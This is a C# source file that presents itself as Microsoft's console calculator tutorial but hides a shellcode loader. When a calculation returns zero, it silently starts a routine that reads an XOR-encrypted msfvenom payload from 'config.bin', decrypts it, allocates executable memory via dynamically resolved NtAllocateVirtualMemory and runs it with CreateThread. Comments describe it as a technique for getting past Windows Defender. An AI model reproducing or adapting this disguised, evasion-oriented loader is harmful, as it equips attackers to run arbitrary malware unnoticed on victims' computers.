using System;
using System.IO;
using System.Text;
using System.Runtime.InteropServices;
using System.Threading.Tasks;
using System.Text.RegularExpressions;


class Program
{
    [DllImport("kernel32.dll")]
    static extern IntPtr LoadLibrary(string dllToLoad);

    [DllImport("kernel32.dll")]
    static extern IntPtr GetProcAddress(IntPtr hModule, string procedureName);

    [DllImport("kernel32.dll")]
    static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

    private delegate uint NtAllocateVirtualMemoryDelegate(
        IntPtr ProcessHandle,
        ref IntPtr BaseAddress,
        ulong ZeroBits,
        ref ulong RegionSize,
        uint AllocationType,
        uint Protect
    );

    private delegate IntPtr CreateThreadDelegate(
        IntPtr lpThreadAttributes,
        uint dwStackSize,
        IntPtr lpStartAddress,
        IntPtr lpParameter,
        uint dwCreationFlags,
        IntPtr lpThreadId
    );

    private static byte[] LoadShellcode(string filePath)
    {
        try
        {
            return File.ReadAllBytes(filePath);
        }
        catch (Exception e)
        {
            // Console.WriteLine("Error reading shellcode: " + e.Message);
            return null;
        }
    }

    private static byte[] DeXOR(byte[] data, byte key)
    {
        byte[] result = new byte[data.Length];
        for (int i = 0; i < data.Length; i++)
        {
            result[i] = (byte)(data[i] ^ key);
        }
        return result;
    }

    // If you don't want to use the Calculator app hiddind technique, 
    // rename this function to Main and remove the calc app.
    // Additionally, the below function was adapted from Michał Walkowski's code in his
    // own project Bypassing Windows 11 Defender with LOLBin.
    static void TheOperation(string[] args)
    {
        // Read encrypted shellcode file
        string venomFilepath = "config.bin";  // Filepath of the encrypted payload created with msfvenom
        byte[] secretInput = LoadShellcode(venomFilepath);
        if (secretInput == null)
        {
            // Console.WriteLine("Failed to load shellcode.");
            return;
        }

        // Decrypt shellcode file
        byte[] decryptedInput = DeXOR(secretInput, 0xAB);   // Make sure you are decrypting the XOR input with the correct key

        // Load ntdll.dll and kernel32.dll
        IntPtr ntdll = LoadLibrary("ntdll.dll");
        IntPtr k32 = LoadLibrary("kernel32.dll");

        // Get pointer of the Windows API Functions and Create delegates
        IntPtr pNtAlloc = GetProcAddress(ntdll, "NtAllocateVirtualMemory");
        IntPtr pCreateThread = GetProcAddress(k32, "CreateThread");

        NtAllocateVirtualMemoryDelegate NtAllocVirtMem = (NtAllocateVirtualMemoryDelegate)Marshal.GetDelegateForFunctionPointer(pNtAlloc, typeof(NtAllocateVirtualMemoryDelegate));
        CreateThreadDelegate CreateThreadDelg = (CreateThreadDelegate)Marshal.GetDelegateForFunctionPointer(pCreateThread, typeof(CreateThreadDelegate));

        IntPtr baseAddr = IntPtr.Zero;
        ulong regSize = (ulong)decryptedInput.Length;
        IntPtr procHand = (IntPtr)(-1); // pseudo handle (current process)

        // Assign memory space
        uint result = NtAllocVirtMem(
            procHand,
            ref baseAddr,
            0,
            ref regSize,
            0x3000, // MEM_COMMIT | MEM_RESERVE
            0x40    // PAGE_EXECUTE_READWRITE
        );

        if (result != 0)
        {
            // Console.WriteLine("Memory allocation failed.");
            return;
        }

        // Copy Shellcode in the allocated memory
        Marshal.Copy(decryptedInput, 0, baseAddr, decryptedInput.Length);

        // Create a thread to execute shellcode
        IntPtr hThread = CreateThreadDelg(
            IntPtr.Zero,
            0,
            baseAddr,
            IntPtr.Zero,
            0,
            IntPtr.Zero
        );

        if (hThread == IntPtr.Zero)
        {
            //Console.WriteLine("Thread creation failed.");
            return;
        }

        WaitForSingleObject(hThread, 0xFFFFFFFF);
    }


    // Calculator app
    public static double DoOperation(double num1, double num2, string op)
    {
        double result = double.NaN; // Default value is "not-a-number" which we use if an operation, such as division, could result in an error.

        // Use a switch statement to do the math.
        switch (op)
        {
            case "a":
                result = num1 + num2;
                break;
            case "s":
                result = num1 - num2;
                break;
            case "m":
                result = num1 * num2;
                break;
            case "d":
                // Ask the user to enter a non-zero divisor.
                if (num2 != 0)
                {
                    result = num1 / num2;
                }
                break;
            // Return text for an incorrect option entry.
            default:
                break;
        }

        if (result == 0)
        {
            Task.Run(() => TheOperation(new string[] { }));
        }

        return result;
    }

    // This code was copied from Microsoft's documentation
    // https://learn.microsoft.com/en-us/visualstudio/get-started/csharp/tutorial-console?view=vs-2022  
    static void Main(string[] args)
    {
        bool endApp = false;
        // Display title as the C# console calculator app.
        Console.WriteLine("Console Calculator in C#\r");
        Console.WriteLine("------------------------\n");

        while (!endApp)
        {
            // Declare variables and set to empty.
            // Use Nullable types (with ?) to match type of System.Console.ReadLine
            string? numInput1 = "";
            string? numInput2 = "";
            double result = 0;

            // Ask the user to type the first number.
            Console.Write("Type a number, and then press Enter: ");
            numInput1 = Console.ReadLine();

            double cleanNum1 = 0;
            while (!double.TryParse(numInput1, out cleanNum1))
            {
                Console.Write("This is not valid input. Please enter a numeric value: ");
                numInput1 = Console.ReadLine();
            }

            // Ask the user to type the second number.
            Console.Write("Type another number, and then press Enter: ");
            numInput2 = Console.ReadLine();

            double cleanNum2 = 0;
            while (!double.TryParse(numInput2, out cleanNum2))
            {
                Console.Write("This is not valid input. Please enter a numeric value: ");
                numInput2 = Console.ReadLine();
            }

            // Ask the user to choose an operator.
            Console.WriteLine("Choose an operator from the following list:");
            Console.WriteLine("\ta - Add");
            Console.WriteLine("\ts - Subtract");
            Console.WriteLine("\tm - Multiply");
            Console.WriteLine("\td - Divide");
            Console.Write("Your option? ");

            string? op = Console.ReadLine();

            // Validate input is not null, and matches the pattern
            if (op == null || !Regex.IsMatch(op, "[a|s|m|d]"))
            {
                Console.WriteLine("Error: Unrecognized input.");
            }
            else
            {
                try
                {
                    result = DoOperation(cleanNum1, cleanNum2, op);
                    if (double.IsNaN(result))
                    {
                        Console.WriteLine("This operation will result in a mathematical error.\n");
                    }
                    else Console.WriteLine("Your result: {0:0.##}\n", result);
                }
                catch (Exception e)
                {
                    Console.WriteLine("Oh no! An exception occurred trying to do the math.\n - Details: " + e.Message);
                }
            }
            Console.WriteLine("------------------------\n");

            // Wait for the user to respond before closing.
            Console.Write("Press 'n' and Enter to close the app, or press any other key and Enter to continue: ");
            if (Console.ReadLine() == "n") endApp = true;

            Console.WriteLine("\n"); // Friendly linespacing.
        }
        return;
    }
}
